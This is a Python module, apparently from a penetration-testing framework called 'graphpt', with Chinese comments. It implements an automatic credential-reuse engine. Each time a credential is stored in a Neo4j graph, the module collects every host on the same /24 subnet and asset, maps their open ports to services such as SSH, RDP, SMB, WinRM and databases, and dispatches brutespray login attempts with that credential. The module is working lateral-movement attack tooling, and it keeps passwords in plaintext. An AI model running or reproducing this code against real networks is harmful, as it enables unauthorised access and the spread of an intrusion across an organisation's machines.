"""凭据自动复用引擎 — 拿到一个凭据，自动打穿一片。

核心逻辑：
  凭据入库（write_credential）→ 触发横向扫描任务：
    1. 同一凭据尝试所有相关服务（SSH/RDP/Redis/MySQL/PostgreSQL/MSSQL）
    2. 同一网段所有主机都试一遍
    3. 同域名所有子域名都试一遍

设计原则：
  - 不主动扫描，只在拿到凭据后触发（被动复用）
  - 复用现有工具（brutespray/hydra/nmap），不重复造轮子
  - 结果写回图：Credential -[:USES_CREDENTIAL]-> IP/Port
"""

from __future__ import annotations

import logging
from typing import Any

_log = logging.getLogger("graphpt.credential_reuse")

# 服务 → 凭据类型映射（什么服务能用什么凭据）
_SERVICE_CRED_MAP: dict[str, list[str]] = {
    "ssh": ["password", "key"],
    "rdp": ["password"],
    "redis": ["password", "none"],  # Redis 可能无密码
    "mysql": ["password"],
    "postgresql": ["password"],
    "mssql": ["password"],
    "ftp": ["password"],
    "telnet": ["password"],
    "vnc": ["password"],
    "smb": ["password", "hash"],
    "winrm": ["password", "hash"],
}

# 端口 → 服务映射（从 Port 节点推导服务类型）
_PORT_SERVICE_MAP: dict[int, str] = {
    22: "ssh", 3389: "rdp", 6379: "redis", 3306: "mysql",
    5432: "postgresql", 1433: "mssql", 21: "ftp", 23: "telnet",
    5900: "vnc", 445: "smb", 5985: "winrm", 5986: "winrm",
}


def _get_services_for_host(ip: str, ports: list[int]) -> list[tuple[str, int]]:
    """根据端口列表推导可尝试的服务。"""
    services = []
    for port in ports:
        svc = _PORT_SERVICE_MAP.get(port)
        if svc:
            services.append((svc, port))
    return services


def trigger_credential_reuse(
    credential_id: str,
    credential_type: str,  # password / key / hash / token
    username: str,
    password: str,
    asset_id: str,
    source_ip: str = "",  # 凭据来源 IP（优先尝试同网段）
) -> dict[str, Any]:
    """凭据入库后触发复用扫描。

    返回：{"dispatched": [...], "targets": [...]}
    """
    from graphpt.collector.neo4j_client import get_graph_writer
    from graphpt.fleet.dispatcher import dispatch_tool

    writer = get_graph_writer()
    dispatched: list[str] = []
    targets: list[str] = []

    # 1. 查同网段所有 IP（同一 /24 网段）
    with writer._driver.session() as session:
        # 同网段 IP
        if source_ip:
            cidr_prefix = ".".join(source_ip.split(".")[:3]) + "."
            rows = session.run(
                """
                MATCH (ip:IP)
                WHERE ip.value STARTS WITH $prefix
                RETURN DISTINCT ip.value AS ip
                LIMIT 50
                """,
                prefix=cidr_prefix,
            ).data()
            same_subnet_ips = [r["ip"] for r in rows]
        else:
            same_subnet_ips = []

        # 同资产所有 IP
        rows = session.run(
            """
            MATCH (a:Asset {id: $aid})-[:HAS_IP]->(ip:IP)
            RETURN DISTINCT ip.value AS ip
            """,
            aid=asset_id,
        ).data()
        asset_ips = [r["ip"] for r in rows]

        # 合并去重
        all_ips = list(dict.fromkeys(same_subnet_ips + asset_ips))

    # 2. 对每个 IP，查开放端口，推导可尝试的服务
    for ip in all_ips:
        with writer._driver.session() as session:
            rows = session.run(
                """
                MATCH (ip:IP {value: $ip})-[:HAS_PORT]->(p:Port)
                WHERE p.state = 'open'
                RETURN p.number AS port
                """,
                ip=ip,
            ).data()
            ports = [r["port"] for r in rows]

        services = _get_services_for_host(ip, ports)
        for svc, port in services:
            # 检查该服务是否支持这种凭据类型
            supported_types = _SERVICE_CRED_MAP.get(svc, [])
            if credential_type not in supported_types:
                continue

            target = f"{svc}://{ip}:{port}"
            targets.append(target)

            # 派发 brutespray 任务（如果可用）
            task_id = dispatch_tool(
                None,  # executor_fn 不用，由 worker 执行
                "brutespray",
                asset_id,
                layer=7,  # Credential 层
                command=f"--target {target} --username {username} --password {password}",
            )
            if task_id:
                dispatched.append(task_id)

    _log.info("credential_reuse_triggered cred=%s targets=%d dispatched=%d",
              credential_id, len(targets), len(dispatched))

    return {
        "credential_id": credential_id,
        "targets": targets,
        "dispatched": dispatched,
        "count": len(dispatched),
    }


def write_credential_and_reuse(
    ip: str,
    service: str,
    username: str,
    password: str,
    credential_type: str = "password",
    asset_id: str = "",
    source: str = "",
) -> dict[str, Any]:
    """写入凭据并自动触发复用扫描。

    这是凭据入库的统一入口：write_credential + trigger_credential_reuse
    """
    from graphpt.collector.neo4j_client import get_graph_writer

    writer = get_graph_writer()

    # 写入凭据节点
    cred_id = f"cred:{ip}:{service}:{username}:{password[:8]}"
    now = __import__("datetime").datetime.now(
        __import__("datetime").timezone.utc
    ).strftime("%Y-%m-%dT%H:%M:%SZ")

    with writer._driver.session() as session:
        session.run(
            """
            MERGE (c:Credential {id: $cred_id})
              ON CREATE SET
                c.ip = $ip, c.service = $service,
                c.username = $username, c.password = $password,
                c.type = $cred_type, c.source = $source,
                c.asset_id = $asset_id, c.created_at = $now
              ON MATCH SET c.last_seen = $now
            WITH c
            MATCH (ip_node:IP {value: $ip})
            MERGE (ip_node)-[:HAS_CREDENTIAL]->(c)
            """,
            cred_id=cred_id, ip=ip, service=service,
            username=username, password=password,
            cred_type=credential_type, source=source,
            asset_id=asset_id, now=now,
        )

    # 触发复用扫描
    reuse_result = trigger_credential_reuse(
        credential_id=cred_id,
        credential_type=credential_type,
        username=username,
        password=password,
        asset_id=asset_id,
        source_ip=ip,
    )

    return {
        "credential_id": cred_id,
        "reuse": reuse_result,
    }